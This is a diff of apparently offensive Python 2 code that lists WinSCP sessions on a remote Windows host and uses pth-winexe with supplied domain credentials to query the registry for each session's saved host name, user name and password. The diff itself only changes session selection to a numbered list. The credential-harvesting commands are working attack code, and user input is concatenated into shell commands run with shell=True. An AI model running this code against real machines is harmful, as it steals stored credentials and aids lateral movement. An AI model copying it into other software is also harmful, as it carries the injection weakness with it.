@@ -1773,6 +1773,7 @@ elif remotetargets[0:6]=='range=':
 		targets.append (remotetarget);
 
 if win_scp!='n':
+	num_sessions = []
 	if len(targets)==1:
 		try:				
 			print colored("[+]Getting WinSCP Sessions:",'green')
@@ -1784,21 +1785,27 @@ if win_scp!='n':
 				sys.exit()	
 
 			print colored("[+]The following WinSCP Sessions Were Found:",'green')
+			
 			k=scp_sessions.splitlines()
+			
 			for session in k:
 				if len(session)>0:
-					print colored("[+]"+session[60:],'yellow')
+					num_sessions.append(session[60:])
 
-			response = raw_input("Enter the name of the session you would like to try and recover details for:")
+			if len(num_sessions)>0:
+				for session in xrange(0,len(num_sessions)):
+					print colored("[+]"+str(session)+" "+num_sessions[session],'yellow')
+
+			response = raw_input("Enter session number you would like to recover details for:")
 			if response !="":
 				
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_host = proc.communicate()[0]	
 			
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_username = proc.communicate()[0]	
 
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_password = proc.communicate()[0]	
 
 				if len(scp_host) and len(scp_username) and len(scp_password)==4:
